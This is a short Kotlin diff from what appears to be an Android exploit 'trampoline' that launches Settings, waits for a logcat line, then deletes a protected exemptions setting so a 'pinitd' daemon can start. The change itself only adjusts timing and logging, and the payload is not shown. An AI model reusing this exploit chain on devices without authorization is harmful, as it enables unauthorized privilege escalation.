@@ -8,6 +8,7 @@ import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import java.io.BufferedReader
 import java.io.InputStreamReader
+import kotlin.time.Duration.Companion.milliseconds
 import kotlin.time.Duration.Companion.seconds
 
 const val TAG = "pinitd-trampoline"
@@ -43,8 +44,11 @@ suspend fun launchPinitd(scope: CoroutineScope, context: Context) {
         Log.w(TAG, "Payload set")
         startApp("Settings", context, settingsIntent)
 
-        logcat.waitForSubstring("com.android.settings/1000 for top-activity {com.android.settings/com.android.settings.Settings", 1.seconds)
-        Log.w(TAG, "Received settings launch log. Sending exemptions clear")
+        if (logcat.waitForSubstring("com.android.settings/1000 for top-activity {com.android.settings/com.android.settings.Settings", 1000.milliseconds)) {
+            Log.w(TAG, "Received settings launch log. Sending exemptions clear")
+        } else {
+            Log.w(TAG, "Didn't receive settings launch log. Sending exemptions clear anyway")
+        }
 
         // TODO: Add success/failure check
         context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)
@@ -52,6 +56,7 @@ suspend fun launchPinitd(scope: CoroutineScope, context: Context) {
         Log.w(TAG, "Trampoline complete")
 
         // TODO: Kill process after delay (to keep `ps` clean)
+        Thread.sleep(500)
     } catch (e: Exception) {
         Log.e(TAG, "Exploit error: ${e.message}")
     }
